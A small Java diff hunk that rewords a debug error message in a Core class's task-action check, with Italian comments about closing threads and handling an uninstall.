@@ -247,7 +247,7 @@ public final class Core implements Runnable {
                 //#endif
                 if (task.checkActions() == false) {
                     //#ifdef DEBUG
-                    debug.error("CheckActions() [Uninstalling?] FAILED");
+                    debug.error("CheckActions() wants to exit");
                     //#endif
                     // chiudere tutti i thread
                     // decidere se e' un uninstall
